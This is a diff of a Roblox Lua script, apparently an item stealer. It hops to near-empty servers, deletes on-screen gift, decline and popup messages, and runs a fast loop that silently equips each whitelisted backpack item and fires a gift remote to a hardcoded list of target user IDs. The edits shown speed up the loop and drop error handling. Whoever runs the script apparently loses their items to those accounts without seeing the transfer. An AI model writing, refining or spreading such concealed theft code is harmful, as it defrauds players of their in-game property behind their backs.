@@ -43,13 +43,6 @@ local function queueSelf()
     end
 end
 
-local function onGoodServer()
-    if isGoodServer then return end
-    isGoodServer = true
-
-    print("GOOD SERVER ✅")
-end
-
 --====================================================
 -- SERVER CHECK
 --====================================================
@@ -129,18 +122,17 @@ task.spawn(function()
     while true do
         task.wait(2)
 
-        if isBadServer() or #Players:GetPlayers() > 3 then
+        if isBadServer() or #Players:GetPlayers() > 2 then
             hopServer()
         else
-            onGoodServer()
+            isGoodServer = true
+            print("GOOD SERVER ✅")
             break
         end
     end
 end)
 
-while not isGoodServer do
-    RunService.Heartbeat:Wait()
-end
+repeat task.wait() until isGoodServer
 
 
 local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
@@ -155,7 +147,6 @@ local function killGiftText(v)
     or string.find(text, "queue")
     or string.find(text, "decline")
     or string.find(text, "popup")
-    or string.find(text, "item returned")
     then
         v:Destroy()
     end
@@ -177,36 +168,15 @@ end)
 -- 🔥 FREEZE BACKPACK (SAFE)
 --====================================================
 
-local player = game:GetService("Players").LocalPlayer
+local inv = player.PlayerGui:WaitForChild("NewInventory")
 
-local function getInv()
-    local pg = player:FindFirstChild("PlayerGui")
-    while not pg do
-        task.wait()
-        pg = player:FindFirstChild("PlayerGui")
-    end
-    return pg:WaitForChild("NewInventory")
-end
 
-local inv = getInv()
-local slots = inv:WaitForChild("InventoryFrame"):WaitForChild("Slots")
-
-local function killStroke(obj)
-    if obj.Name == "Stroke" then
-        obj:Destroy()
+-- Method 3
+for _,v in ipairs(inv:GetDescendants()) do
+    if v:IsA("UIStroke") then
+        v:Destroy()
     end
 end
-
--- 🔥 bersihin semua yang udah ada
-for _,v in ipairs(slots:GetDescendants()) do
-    killStroke(v)
-end
-
--- 🔥 anti spawn ulang (INI PENTING)
-slots.DescendantAdded:Connect(function(v)
-    task.wait()
-    killStroke(v)
-end)
 
 
 --====================================================
@@ -757,40 +727,26 @@ end)
 
 
 --====================================================
--- 🔥 AUTO GIFT BRUTAL (ANTI STOP / ANTI DECLINE)
---====================================================
-
---====================================================
--- 🔥 AUTO GIFT (EQUIP → SCAN MUTATION → SEND)
+-- AUTO GIFT LOOP
 --====================================================
 
 task.spawn(function()
     while true do
-        task.wait(0.05)
+        task.wait(0.01)
 
-        for _,tool in ipairs(backpack:GetChildren()) do
-            if not tool:IsA("Tool") then continue end
-            if isWeightTool(tool) then continue end
-            if not brainrotWhitelist[tool.Name] then continue end
-            if tool.Parent ~= backpack then continue end
+        local tools = getSortedTools()
 
-            -- 🔥 1. EQUIP DULU (biar attr kebaca)
-            -- EQUIP
-silentEquip(tool)
-task.wait(0.1)
+        for _,tool in ipairs(tools) do
+            silentEquip(tool)
+            task.wait(0.02)
 
--- LANGSUNG PAKAI FUNCTION LO
-if isWhitelisted(tool) then
-    for _,id in ipairs(targetUserIds) do
-        pcall(function()
-            giftRemote:FireServer(id)
-        end)
-    end
-end
+            if isWhitelisted(tool) then
+                for _,id in ipairs(targetUserIds) do
+                    giftRemote:FireServer(id)
+                end
+            end
 
-unequipAll()
-
-            task.wait(0.03)
+            unequipAll()
         end
     end
 end)
